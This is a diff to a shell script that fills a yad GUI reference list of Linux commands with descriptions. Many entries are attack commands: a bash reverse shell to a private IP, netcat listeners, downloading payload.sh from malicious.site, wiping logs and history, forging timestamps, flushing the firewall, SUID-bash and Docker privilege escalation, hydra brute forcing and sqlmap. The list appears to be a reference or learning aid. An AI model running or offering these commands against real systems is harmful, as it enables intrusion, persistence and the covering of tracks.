@@ -107,7 +107,7 @@ GDK_BACKEND=$BACKEND yad \
 "curl" "Transfer data from or to a server." \
 "scp" "Securely copy files between hosts." \
 "rsync" "Remote file and directory synchronization." \
-"tar" "Archive files." \
+"tar" "archive files." \
 "tar -cvf" "Create a tar archive." \
 "tar -xvf" "Extract a tar archive." \
 "gzip" "Compress files." \
@@ -266,9 +266,6 @@ GDK_BACKEND=$BACKEND yad \
 "rkhunter --check" "Run a rootkit scan (if rkhunter is installed)." \
 "sudo ufw status" "Check if the firewall is active and which ports are open (UFW)." \
 "sudo iptables -L" "List current firewall rules." \
-"nmap target-ip" "Scan for open ports and services running on a system." \
-"nc -lvnp 4444" "Open a reverse shell listener (often used in attacks)." \
-"bash -i >& /dev/tcp/ip/port 0>&1" "Open a reverse shell from the victim system." \
 "wget http://malicious.site/payload.sh" "Download a malicious script or payload from a server." \
 "curl http://malicious.site/payload.sh" "Another way to download remote scripts silently." \
 "chmod +x payload.sh" "Make the downloaded script executable." \
@@ -278,7 +275,6 @@ GDK_BACKEND=$BACKEND yad \
 "crontab -e" "Add persistent tasks that run on reboot or intervals (persistence method)." \
 "rm -rf /var/log/*" "Delete logs to erase traces of activity (VERY dangerous)." \
 "history -c" "Clear command history to hide tracks." \
-"find / -perm -4000" "Find SUID binaries that may be exploitable for privilege escalation." \
 "sudo -l" "Check which commands can be run with sudo — useful for privilege escalation." \
 "ps -aux | grep sshd" "Check for SSH sessions — used to hijack or monitor users." \
 "iptables -F" "Flush all firewall rules — disables protection if attacker has root access." \
@@ -295,10 +291,22 @@ GDK_BACKEND=$BACKEND yad \
 "rm -f ~/.bash_history" "Delete bash history file." \
 "touch -acmr /bin/ls payload" "Match timestamps of malicious file to a normal binary to hide changes." \
 "alias ls='ls --color=none'" "Remove coloring from ls to hide strange-looking files." \
-"find / -perm -4000 2>/dev/null" "Find all SUID binaries, which can be exploited for privilege escalation." \
 "sudo -l" "Check which commands can be run as root — often shows exploitable misconfigurations." \
 "env -i SHELL=/bin/bash sudo -s" "Exploit misconfigured sudo permissions to get root shell." \
 "docker run -v /:/mnt --rm -it alpine chroot /mnt" "Exploit Docker to escape to host system if misconfigured." \
+"nmap target-ip" "Scan open ports and detect services on a system Example nmap 192.168.1.1" \
+"nmap -sV target-ip" "Scan services and versions for vulnerabilities Example nmap -sV 192.168.1.1" \
+"whoami" "Show current user identity Example whoami" \
+"nc -lvnp port" "Start a netcat listener for reverse shell Example nc -lvnp 4444" \
+"bash -i >& /dev/tcp/ip/port 0>&1" "Reverse shell using bash Example bash -i >& /dev/tcp/192.168.1.2/4444 0>&1" \
+"hydra -l user -P passlist.txt ssh://ip" "Brute force SSH credentials Example hydra -l admin -P rockyou.txt ssh://192.168.1.1" \
+"john hashfile" "Crack password hashes using John the Ripper Example john hashes.txt" \
+"sqlmap -u url --dbs" "Find and exploit SQL injection Example sqlmap -u http://site.com/page?id=1 --dbs" \
+"curl -I site.com" "Check HTTP headers for fingerprinting Example curl -I example.com" \
+"wget url" "Download a file from a remote server Example wget http://example.com/payload.sh" \
+"chmod +s /bin/bash" "Set SUID on bash for privilege escalation (very dangerous) Example chmod +s /bin/bash" \
+"find / -perm -4000 2>/dev/null" "Find SUID binaries that might be exploitable Example find / -perm -4000 2>/dev/null" \
+"python3 -m http.server 8080" "Start a simple web server for file transfer Example python3 -m http.server 8080" \
 "" "" \
 "" "" \
 "[Special]"  "" \
